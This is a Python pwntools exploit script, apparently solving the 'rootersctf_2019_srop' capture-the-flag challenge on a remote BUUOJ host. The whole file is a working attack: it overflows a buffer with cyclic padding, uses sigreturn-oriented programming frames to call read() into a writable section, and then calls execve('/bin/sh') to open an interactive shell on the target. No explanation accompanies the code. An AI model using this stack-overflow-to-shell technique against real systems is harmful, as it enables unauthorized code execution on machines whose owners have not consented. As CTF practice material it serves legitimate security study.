from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('rootersctf_2019_srop')
io = remote('node4.buuoj.cn', 26350)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('rootersctf_2019_srop')
data_addr = 0x402000
pop_rax_syscall_leave_ret = 0x401032
syscall_leave_ret = 0x401033

sigFrame = SigreturnFrame()
# read(0, data_addr, 0x400)
sigFrame.rax = 0
sigFrame.rdi = 0
sigFrame.rsi = data_addr
sigFrame.rdx = 0x400
sigFrame.rip = syscall_leave_ret
sigFrame.rbp = data_addr

# gdb.attach(io)
# pause()
payload = cyclic(0x88) + p64(pop_rax_syscall_leave_ret) + p64(0xf) + bytes(sigFrame)
io.sendlineafter('Hey, can i get some feedback for the CTF?\n', payload)

sigFrame = SigreturnFrame()
# execve('/bin/sh', 0, 0)
sigFrame.rax = 0x3b
sigFrame.rdi = data_addr
sigFrame.rsi = 0
sigFrame.rdx = 0
sigFrame.rip = syscall_leave_ret

payload = b'/bin/sh\x00' + p64(pop_rax_syscall_leave_ret) + p64(0xf) + bytes(sigFrame)
io.sendline(payload)
io.interactive()
